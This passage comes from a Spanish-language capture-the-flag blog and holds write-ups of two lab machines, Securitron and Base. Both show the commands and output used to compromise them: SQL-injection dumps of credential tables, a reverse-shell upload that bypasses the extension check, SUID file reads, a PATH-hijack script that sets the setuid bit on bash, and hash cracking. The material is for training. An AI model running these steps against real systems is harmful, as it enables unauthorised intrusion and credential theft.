<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-w</span> ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> http://admin19-32.securitron.thl <span class="nt">-r</span> <span class="nt">-d</span> 1 <span class="nt">-x</span> .php
...
200      GET      111l      300w     5201c http://admin19-32.securitron.thl/Account/login.php
200      GET       19l       89w     1583c http://admin19-32.securitron.thl/Account/
...
</code></pre></div></div>

<p>Entre otras encontramos un panel de <strong>login</strong>.</p>

<h1 id="intrusión">Intrusión</h1>

<p>Capturamos la petición con <code class="language-plaintext highlighter-rouge">Caido</code> o <code class="language-plaintext highlighter-rouge">Burp Suite</code> y lanzamos <code class="language-plaintext highlighter-rouge">ghauri</code> en busca de alguna vulnerabilidad <strong>SQLi:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-r</span> req.txt
Ghauri identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 53 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
<span class="nt">---</span>
Parameter: txtusername <span class="o">(</span>POST<span class="o">)</span>
</code></pre></div></div>

<p>Vemos que existe una vulnerabilidad <strong>SQLi</strong>. Le pedimos que nos de las BBDD existentes/</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-r</span> req.txt <span class="nt">--dbs</span>
available databases <span class="o">[</span>2]:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> pms_db
</code></pre></div></div>

<p>En este caso nos interesa la base de datos <strong>pms_db</strong>. Le pedimos las tablas de esa BBDD:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-r</span> req.txt <span class="nt">-D</span> pms_db <span class="nt">--tables</span>
Database: pms_db
<span class="o">[</span>3 tables]
+-------------+
| <span class="nb">users</span>       |
| tblemployee |
| tblleave    |
+-------------+
</code></pre></div></div>

<p>Ahora vamos a dumpear las tablas <strong>tblemployee</strong> y <strong>users</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-r</span> req.txt <span class="nt">-D</span> pms_db <span class="nt">-T</span> tblemployee <span class="nt">--dump</span>
Database: pms_db
Table: tblemployee
<span class="o">[</span>1 entries]
+----+---------------------+----------------+-------------+------+-------------------------------+-----------+-------------+-------------+---------------+---------+---------------+------------------+--------------+-----------+--------+--------------+---------------------------+
| <span class="nb">id</span> | employeeID          | fullname       | password    | sex  | email                         | dob       | phone       | address     | qualification | dept    | employee_type | date_appointment | basic_salary | gross_pay | status | leave_status | photo                     |
+----+---------------------+----------------+-------------+------+-------------------------------+-----------+-------------+-------------+---------------+---------+---------------+------------------+--------------+-----------+--------+--------------+---------------------------+
| 7  | STAFF/FKP/2023/4860 | Ndueso Akpabio | escobar2012 | Male | newleastpaysolution@gmail.com | 12/9/1980 | 08067361023 | 12 Ikono rd | Msc           | Bursary | Academic      | 9/9/2023         | 21000        | 25000     | 1      | Pending      | uploadImage/Profile/2.png |
+----+---------------------+----------------+-------------+------+-------------------------------+-----------+-------------+-------------+---------------+---------+---------------+------------------+--------------+-----------+--------+--------------+---------------------------+
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-r</span> req.txt <span class="nt">-D</span> pms_db <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">--dump</span>
Database: pms_db
Table: <span class="nb">users</span>
<span class="o">[</span>1 entries]
+----------+--------------+-----------+----------+------------------------+
| username | password     | phone     | fullname | photo                  |
+----------+--------------+-----------+----------+------------------------+
| admin    | Ntpqc6Z7MDkG | 699696969 | Lenam    | uploadImage/avatar.png |
+----------+--------------+-----------+----------+------------------------+

</code></pre></div></div>

<p>Entramos al panel de admin con las credenciales.</p>

<p><img src="/assets/images/securitron/2.png" alt="image" /></p>

<p>En el apartado de cambiar de avatar vemos que podemos subir imágenes.</p>

<p><img src="/assets/images/securitron/3.png" alt="image" /></p>

<p>Subimos una reverse shell con extension <strong>png</strong>, capturamos con <strong>Caido</strong> la petición y le cambiamos la extension a <strong>php</strong>.</p>

<p>Nos ponemos a la escucha con <strong>Netcat</strong> y obtenemos la shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
Ncat: Version 7.93 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.0.2.172.
Ncat: Connection from 10.0.2.172:43200.
</code></pre></div></div>

<p>Hacemos el tratamiento de la tty y ya estamos dentro.</p>

<p>Hacemos una busqueda de ficheros con el bit SUID activo:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@TheHackersLabs-Securitron:/<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
/usr/bin/x86_64-linux-gnu-ar
</code></pre></div></div>

<p>Encontramos en <a href="https://gtfobins.github.io/gtfobins/ar/#suid">GTFOBins</a> que podemos leer ficheros del sistema como si fueramos <strong>root.</strong>  Vamos a leer el fichero <strong>user.txt.</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@TheHackersLabs-Securitron:/<span class="nv">$ TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span><span class="si">)</span>
www-data@TheHackersLabs-Securitron:/<span class="nv">$ LFILE</span><span class="o">=</span>/home/securitybot/user.txt
www-data@TheHackersLabs-Securitron:/<span class="nv">$ </span>/usr/bin/x86_64-linux-gnu-ar r <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$LFILE</span><span class="s2">"</span>
www-data@TheHackersLabs-Securitron:/<span class="nv">$ </span><span class="nb">cat</span> <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span>
<span class="o">!</span>&lt;<span class="nb">arch</span><span class="o">&gt;</span>
user.txt/       0           0     0     644     74        <span class="sb">`</span>
463061<span class="k">*********</span>

No olvides la contraseña: 0KjcFEkuUEXG
www-data@TheHackersLabs-Securitron:/<span class="err">$</span>
</code></pre></div></div>

<p>Encontramos la flag de user y la contraseña del usuario <strong>securitybot</strong>. Nos logeamos con el usuario y vemos que puede ejecutar como <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securitybot@TheHackersLabs-Securitron:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span>: unable to resolve host TheHackersLabs-Securitron: Name or service not known
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>securitybot: 
Matching Defaults entries <span class="k">for </span>securitybot on TheHackersLabs-Securitron:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
    use_pty

User securitybot may run the following commands on TheHackersLabs-Securitron:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> /usr/bin/ar
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Vemos que puede ejecutar como <strong>root</strong> el binario <code class="language-plaintext highlighter-rouge">ar</code>.  Si intentamos leer la flag de root nos encontramos con un mensaje diciendo que no esta hay la flag.</p>

<p>Seguimos enumerando el servidor:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securitybot@TheHackersLabs-Securitron:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /opt/
total 12
drwxr-xr-x  2 root root 4096 Jul 31 13:09 <span class="nb">.</span>
drwxr-xr-x 18 root root 4096 Sep  8 17:45 ..
<span class="nt">-rwxr-xr-x</span>  1 root root  767 Jul 31 12:49 backup_bd.sh
</code></pre></div></div>

<p>Encontramos un script que que hace un backup de la BBDD. Vamos a ver que hace el script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securitybot@TheHackersLabs-Securitron:~<span class="nv">$ </span><span class="nb">cat</span> /opt/backup_bd.sh 
<span class="c">#!/bin/bash</span>

<span class="c"># Verificar si se pasó un argumento (la fecha)</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">echo</span> <span class="s2">"Uso: </span><span class="nv">$0</span><span class="s2"> &lt;fecha&gt;"</span>
  <span class="nb">exit </span>1
<span class="k">fi</span>

<span class="c"># Variables</span>
<span class="nv">FECHA</span><span class="o">=</span><span class="nv">$1</span>
<span class="nv">USUARIO</span><span class="o">=</span><span class="s2">"matomo"</span>
<span class="nv">CONTRASENA</span><span class="o">=</span><span class="s2">"7pUYlPYpziv1"</span>
<span class="nv">BASE_DATOS</span><span class="o">=</span><span class="s2">"pms_db"</span>
<span class="nv">CARPETA_BACKUP</span><span class="o">=</span><span class="s2">"/root/backups"</span>
<span class="nv">NOMBRE_BACKUP</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">CARPETA_BACKUP</span><span class="k">}</span><span class="s2">/backup_</span><span class="k">${</span><span class="nv">BASE_DATOS</span><span class="k">}</span><span class="s2">_</span><span class="k">${</span><span class="nv">FECHA</span><span class="k">}</span><span class="s2">.sql"</span>

<span class="c"># Crear carpeta de backups si no existe</span>
/bin/mkdir <span class="nt">-p</span> <span class="nv">$CARPETA_BACKUP</span>

<span class="c"># Crear backup</span>
/usr/bin/mysqldump <span class="nt">-u</span> <span class="nv">$USUARIO</span> <span class="nt">-p</span><span class="nv">$CONTRASENA</span> <span class="nv">$BASE_DATOS</span> <span class="o">&gt;</span> <span class="nv">$NOMBRE_BACKUP</span>

<span class="c"># Verificar si el backup se creó exitosamente</span>
<span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">echo</span> <span class="s2">"Backup creado exitosamente: </span><span class="nv">$NOMBRE_BACKUP</span><span class="s2">"</span>
<span class="k">else
  </span><span class="nb">echo</span> <span class="s2">"Error al crear el backup"</span>
  <span class="nb">exit </span>1
<span class="k">fi</span>

<span class="c"># Mantener solo los dos últimos backups</span>
/bin/ls <span class="nt">-t</span> <span class="nv">$CARPETA_BACKUP</span> | /usr/bin/sed <span class="nt">-e</span> <span class="s1">'1,2d'</span> | /usr/bin/xargs <span class="nt">-d</span> <span class="s1">'\n'</span> /bin/rm <span class="nt">-f</span>
</code></pre></div></div>

<p>Vamos a ver si hay alguna tarea <strong>cron</strong> con <code class="language-plaintext highlighter-rouge">pspy64</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1903   | /usr/sbin/CRON <span class="nt">-f</span> 
2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1904   | /usr/sbin/CRON <span class="nt">-f</span> 
2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1905   | /bin/sh <span class="nt">-c</span> /opt/backup_bd.sh <span class="sb">`</span><span class="nb">date</span> +%F<span class="sb">`</span> 
2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1906   | 
2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1907   | /bin/mkdir <span class="nt">-p</span> /root/backups 
2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1908   | /bin/bash /opt/backup_bd.sh 2024-09-14 
2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1911   | /bin/bash /opt/backup_bd.sh 2024-09-14 
2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1910   | 
2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1909   | /bin/ls <span class="nt">-t</span> /root/backups 
2024/09/14 17:45:01 CMD: <span class="nv">UID</span><span class="o">=</span>0     <span class="nv">PID</span><span class="o">=</span>1912   | /usr/bin/xargs <span class="nt">-d</span> <span class="se">\n</span> /bin/rm <span class="nt">-f</span> 

</code></pre></div></div>

<p>Vemos que hay una tarea de <strong>root</strong>. Como podemos leer ficheros como <strong>root</strong> con el binario <code class="language-plaintext highlighter-rouge">ar</code>, vamos a ver que contiene el fichero <strong>cron</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span><span class="si">)</span>
<span class="nv">LFILE</span><span class="o">=</span>/var/spool/cron/crontabs/root
<span class="nb">sudo </span>ar r <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$LFILE</span><span class="s2">"</span>
<span class="nb">cat</span> <span class="s2">"</span><span class="nv">$TF</span><span class="s2">"</span>

<span class="o">!</span>&lt;<span class="nb">arch</span><span class="o">&gt;</span>
root/           0           0     0     644     1239      <span class="sb">`</span>
<span class="c"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span>
<span class="c"># (/tmp/crontab.3cCTUG/crontab installed on Thu Aug 22 23:03:21 2024)</span>
<span class="c"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span>
<span class="nv">PATH</span><span class="o">=</span><span class="s2">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/home/securitybot/.local/bin:/usr/bin:/sbin:/bin"</span>
<span class="nv">MAILTO</span><span class="o">=</span><span class="s2">""</span>
<span class="c"># Edit this file to introduce tasks to be run by cron.</span>
<span class="c"># </span>
<span class="c"># Each task to run has to be defined through a single line</span>
<span class="c"># indicating with different fields when the task will be run</span>
<span class="c"># and what command to run for the task</span>
<span class="c"># </span>
<span class="c"># To define the time you can provide concrete values for</span>
<span class="c"># minute (m), hour (h), day of month (dom), month (mon),</span>
<span class="c"># and day of week (dow) or use '*' in these fields (for 'any').</span>
<span class="c"># </span>
<span class="c"># Notice that tasks will be started based on the cron's system</span>
<span class="c"># daemon's notion of time and timezones.</span>
<span class="c"># </span>
<span class="c"># Output of the crontab jobs (including errors) is sent through</span>
<span class="c"># email to the user the crontab file belongs to (unless redirected).</span>
<span class="c"># </span>
<span class="c"># For example, you can run a backup of all your user accounts</span>
<span class="c"># at 5 a.m every week with:</span>
<span class="c"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
<span class="c"># </span>
<span class="c"># For more information see the manual pages of crontab(5) and cron(8)</span>
<span class="c"># </span>
<span class="c"># m h  dom mon dow   command</span>
<span class="k">*</span>/1 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span>     /opt/backup_bd.sh <span class="sb">`</span><span class="nb">date</span> +<span class="se">\%</span>F<span class="sb">`</span>

</code></pre></div></div>

<p>Si nos fijamos en el <strong>PATH</strong> vemos que hay un directorio dentro del home del usuario en el que tenemos permiso de escritura. También vemos que usa el comando <code class="language-plaintext highlighter-rouge">date</code> sin la ruta completa. Vamos a realizar un <strong>path hijacking</strong>. Creamos un fichero con el nombre <strong>date</strong> y con permiso de <strong>ejecución</strong> en el directorio <strong>/home/securitybot/.local/bin:</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="nb">chmod</span> +s /usr/bin/bash
</code></pre></div></div>

<p>Ahora esperamos a que se ejecute la tarea:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securitybot@TheHackersLabs-Securitron:~<span class="nv">$ </span>watch <span class="nt">-n</span> 1 <span class="nb">ls</span> <span class="nt">-l</span> /usr/watch <span class="nt">-n</span> 1 <span class="nb">ls</span> <span class="nt">-l</span> /usr/bin/bash
</code></pre></div></div>

<p>Y ya solo queda ejecutar <code class="language-plaintext highlighter-rouge">bash -p</code> para ser <strong>root</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>securitybot@TheHackersLabs-Securitron:~<span class="nv">$ </span>bash <span class="nt">-p</span>
bash-5.2# <span class="nb">whoami
</span>root
bash-5.2# <span class="nb">hostname
</span>TheHackersLabs-Securitron
bash-5.2#
</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="linux" /><category term="profesional" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Base</title><link href="/posts/base/" rel="alternate" type="text/html" title="Base" /><published>2024-09-13T00:00:00+00:00</published><updated>2024-09-13T00:00:00+00:00</updated><id>/posts/base</id><content type="html" xml:base="/posts/base/"><![CDATA[<p><img src="/assets/images/base/0.jpg" alt="image" /></p>

<p>En esta ocasión voy a resolver una máquina <strong>Linux</strong> creada por <strong>rodgar</strong> de dificultad <strong>Avanzado</strong> para la plataforma de <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>

<h3 id="1-escaneo-de-la-red-local">1: Escaneo de la red local</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> enp0s8 <span class="nt">--localnet</span>
</code></pre></div></div>

<p>Este comando utiliza <code class="language-plaintext highlighter-rouge">arp-scan</code>, que es una herramienta para descubrir hosts en una red local utilizando el protocolo ARP. La opción <code class="language-plaintext highlighter-rouge">-I enp0s8</code> especifica la interfaz de red, que en este caso es <code class="language-plaintext highlighter-rouge">enp0s8</code>. El parámetro <code class="language-plaintext highlighter-rouge">--localnet</code> le dice a la herramienta que escanee toda la red local.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.0.2.10       08:00:27:11:15:84       PCS Systemtechnik GmbH
</code></pre></div></div>

<p>Aquí vemos que se encontró un dispositivo en la red local con la dirección IP <code class="language-plaintext highlighter-rouge">10.0.2.10</code> y la dirección MAC correspondiente.</p>

<hr />

<h3 id="2-escaneo-de-puertos">2: Escaneo de puertos</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rustscan <span class="nt">-a</span> 10.0.2.10 <span class="nt">-b</span> 10
</code></pre></div></div>

<p>Usamos <code class="language-plaintext highlighter-rouge">rustscan</code>, que es una herramienta rápida de escaneo de puertos, para ver qué puertos están abiertos en la máquina con IP <code class="language-plaintext highlighter-rouge">10.0.2.10</code>. La opción <code class="language-plaintext highlighter-rouge">-a</code> especifica la dirección IP, y <code class="language-plaintext highlighter-rouge">-b</code> es para el batch size (número de puertos que se escanean simultáneamente).</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Open 10.0.2.10:22
Open 10.0.2.10:80
Open 10.0.2.10:8080
</code></pre></div></div>

<p>Esto nos dice que los puertos 22 (SSH), 80 (HTTP) y 8080 (HTTP alternativo) están abiertos.</p>

<hr />

<h3 id="3-escaneo-detallado-con-nmap">3: Escaneo detallado con Nmap</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,8080 10.0.2.10
</code></pre></div></div>

<p>Con <code class="language-plaintext highlighter-rouge">nmap</code> hacemos un escaneo más profundo en los puertos descubiertos, usando las opciones <code class="language-plaintext highlighter-rouge">-sCV</code> para obtener versiones de los servicios y ejecutar scripts básicos. La opción <code class="language-plaintext highlighter-rouge">-p</code> especifica los puertos a escanear.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.62 <span class="o">((</span>Debian<span class="o">))</span>
8080/tcp open  http    Apache httpd 2.4.62 <span class="o">((</span>Debian<span class="o">))</span>
</code></pre></div></div>

<p>Vemos que el puerto 22 está corriendo <code class="language-plaintext highlighter-rouge">OpenSSH</code>, y los puertos 80 y 8080 están usando el servidor web Apache. Además, el puerto 80 está corriendo una aplicación llamada <code class="language-plaintext highlighter-rouge">FlatPress</code>.</p>

<hr />

<h3 id="4-explotación-con-sqli">4: Explotación con SQLi</h3>
<p>Echamos un vistazo a las webs que hay en el puerto 80 y 8080 y vemos que hay un posible SQLi al realizar una busqueda.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-u</span> http://10.0.2.10:8080/search.php?query<span class="o">=</span>a <span class="nt">--dbs</span>
</code></pre></div></div>

<p>Se utilizó <code class="language-plaintext highlighter-rouge">ghauri</code>, una herramienta para explotar inyecciones SQL (SQLi). La opción <code class="language-plaintext highlighter-rouge">-u</code> indica la URL objetivo, y <code class="language-plaintext highlighter-rouge">--dbs</code> pide que se enumeren las bases de datos disponibles.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>available databases <span class="o">[</span>6]:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> performance_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Nombres
<span class="o">[</span><span class="k">*</span><span class="o">]</span> sys
<span class="o">[</span><span class="k">*</span><span class="o">]</span> mysql
<span class="o">[</span><span class="k">*</span><span class="o">]</span> information_schema
<span class="o">[</span><span class="k">*</span><span class="o">]</span> FlatPress
</code></pre></div></div>

<p>Esto confirma que se puede explotar la vulnerabilidad SQLi, y muestra las bases de datos disponibles. Nos interesa la base de datos <code class="language-plaintext highlighter-rouge">FlatPress</code>.</p>

<hr />

<h3 id="5-dump-de-la-tabla-de-login">5: Dump de la tabla de login</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ghauri <span class="nt">-u</span> http://10.0.2.10:8080/search.php?query<span class="o">=</span>a <span class="nt">-D</span> FlatPress <span class="nt">-T</span> login <span class="nt">--dump</span>
</code></pre></div></div>

<p>Aquí estamos dumpeando (extrayendo) el contenido de la tabla <code class="language-plaintext highlighter-rouge">login</code> en la base de datos <code class="language-plaintext highlighter-rouge">FlatPress</code>. La opción <code class="language-plaintext highlighter-rouge">-D</code> especifica la base de datos, <code class="language-plaintext highlighter-rouge">-T</code> la tabla, y <code class="language-plaintext highlighter-rouge">--dump</code> para volcar el contenido.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+----+--------+-----------------------+
| <span class="nb">id</span> | user   | password              |
+----+--------+-----------------------+
| 1  | r0dgar | SNIETbkGBCnhFqeUJuqBO |
+----+--------+-----------------------+
</code></pre></div></div>

<p>Logramos extraer las credenciales del usuario <code class="language-plaintext highlighter-rouge">r0dgar</code>.
Nos logueamos en el panel de admin con las credenciales y aprovechando de una vulnerabilidad que hay en la versión de FlatPress, subimos una shell reversa. Podemos seguir los pasos que explican aquí <a href="https://github.com/flatpressblog/flatpress/issues/152">https://github.com/flatpressblog/flatpress/issues/152</a></p>

<hr />

<h3 id="6-iniciar-un-listener-con-netcat">6: Iniciar un listener con Netcat</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
</code></pre></div></div>

<p>Con este comando usamos <code class="language-plaintext highlighter-rouge">netcat</code> para iniciar un listener en el puerto 8888. La opción <code class="language-plaintext highlighter-rouge">-n</code> deshabilita DNS, <code class="language-plaintext highlighter-rouge">-l</code> es para escuchar conexiones entrantes, <code class="language-plaintext highlighter-rouge">-v</code> para modo detallado, y <code class="language-plaintext highlighter-rouge">-p</code> especifica el puerto.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ncat: Connection from 10.0.2.10:52336.
</code></pre></div></div>

<p>Se establece una conexión desde la IP <code class="language-plaintext highlighter-rouge">10.0.2.10</code>. Hacemos el tratamiento de la tty y ya estamos dentro del servidor.</p>

<hr />

<h3 id="7-ver-usuarios-del-sistema">7: Ver usuarios del sistema</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@TheHackersLabs-Base:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
</code></pre></div></div>

<p>Este comando muestra todos los usuarios del sistema que tienen acceso a un shell bash.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
pedro:x:1001:1001::/home/pedro:/bin/bash
flate:x:1002:1002::/home/flate:/bin/bash
</code></pre></div></div>

<p>Tenemos dos usuarios: <code class="language-plaintext highlighter-rouge">pedro</code> y <code class="language-plaintext highlighter-rouge">flate</code>.</p>

<hr />

<h3 id="8-buscar-archivos-de-pedro">8: Buscar archivos de pedro</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@TheHackersLabs-Base:/<span class="nv">$ </span>find / <span class="nt">-user</span> pedro <span class="nt">-type</span> f 2&gt;/dev/null
</code></pre></div></div>

<p>Buscamos archivos que pertenezcan al usuario <code class="language-plaintext highlighter-rouge">pedro</code>. La opción <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code> es para ocultar mensajes de error.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/hash.txt
</code></pre></div></div>

<p>Encontramos un archivo interesante: <code class="language-plaintext highlighter-rouge">/opt/hash.txt</code>.</p>

<hr />

<h3 id="9-ver-contenido-del-archivo-hashtxt">9: Ver contenido del archivo hash.txt</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@TheHackersLabs-Base:/<span class="nv">$ </span><span class="nb">cat</span> /opt/hash.txt
</code></pre></div></div>

<p>Mostramos el contenido del archivo.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$2b$12$Qq75yQ3G</span>.ydG2nxr4LzAPeJ6GE8po1NtjOAGZ2l1aIGa5//I5J/Xq
</code></pre></div></div>

<p>Parece ser un hash bcrypt.</p>

<hr />

<h3 id="10-cracking-del-hash">10: Cracking del hash</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hashcat <span class="nt">-m</span> 3200 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt
</code></pre></div></div>

<p>Usamos <code class="language-plaintext highlighter-rouge">hashcat</code> para crackear el hash usando la wordlist <code class="language-plaintext highlighter-rouge">rockyou.txt</code>.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$2b$12$Qq75yQ3G</span>.ydG2nxr4LzAPeJ6GE8po1NtjOAGZ2l1aIGa5//I5J/Xq:secret
</code></pre></div></div>

<p>La contraseña correspondiente al hash es <code class="language-plaintext highlighter-rouge">secret</code>.</p>

<hr />

<h3 id="11-buscar-en-logs-de-apache">11: Buscar en logs de Apache</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pedro@TheHackersLabs-Base:/var/log/apache2<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-rnw</span> flate <span class="nb">.</span>
</code></pre></div></div>

<p>Buscamos la palabra <code class="language-plaintext highlighter-rouge">flate</code> en los logs de Apache.</p>

<p>Salida:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./access.log.1:21:203.0.113.56 - flate <span class="o">[</span>12/Sep/2024:12:03:55 +0000] <span class="s2">"POST /login HTTP/1.1"</span> 401 4812 <span class="s2">"username=flate&amp;password=HPAbcmOgSjidaoWkXUQjw"</span>
</code></pre></div></div>

<p>Encontramos las credenciales de <code class="language-plaintext highlighter-rouge">flate</code>: <code class="language-plaintext highlighter-rouge">HPAbcmOgSjidaoWkXUQjw</code>.</p>

<hr />

<h3 id="12-cambiar-a-usuario-flate">12: Cambiar a usuario flate</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pedro@TheHackersLabs-Base:/var/log/apache2<span class="nv">$ </span>su flate
</code></pre></div></div>

<p>Usamos el comando <code class="language-plaintext highlighter-rouge">su</code> para cambiar al usuario <code class="language-plaintext highlighter-rouge">flate</code> usando la contraseña encontrada.</p>

<hr />

<h3 id="13-escalada-de-privilegios">13: Escalada de privilegios</h3>

